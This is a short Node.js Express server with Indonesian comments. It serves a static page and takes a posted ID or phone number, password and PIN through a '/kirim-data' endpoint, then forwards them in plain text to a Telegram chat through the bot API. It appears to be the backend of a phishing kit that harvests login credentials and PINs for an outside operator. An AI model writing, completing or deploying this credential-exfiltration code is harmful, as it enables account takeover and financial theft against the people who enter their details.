require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');

const app = express();
const PORT = 3000;

// ⚠️ Simpan kredensial di file .env — JANGAN pernah bagikan ke orang lain!
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.static('.'));
app.use(bodyParser.json());

// Kirim data ke Telegram
app.post('/kirim-data', (req, res) => {
  const { id, sandi, pin } = req.body;

  const pesan = encodeURIComponent(
    `📥 Data Masuk:\n` +
    `━━━━━━━━━━━━━━━\n` +
    `📱 Nomor/ID: ${id}\n` +
    `🔑 Kata Sandi: ${sandi}\n` +
    `🔢 PIN: ${pin}\n` +
    `━━━━━━━━━━━━━━━`
  );

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;

  https.get(url, (resp) => {
    let data = '';
    resp.on('data', chunk => data += chunk);
    resp.on('end', () => res.json({ sukses: true }));
  }).on('error', (err) => {
    console.error('❌ Error:', err.message);
    res.status(500).json({ sukses: false, pesan: err.message });
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server berjalan di http://localhost:${PORT}`);
});
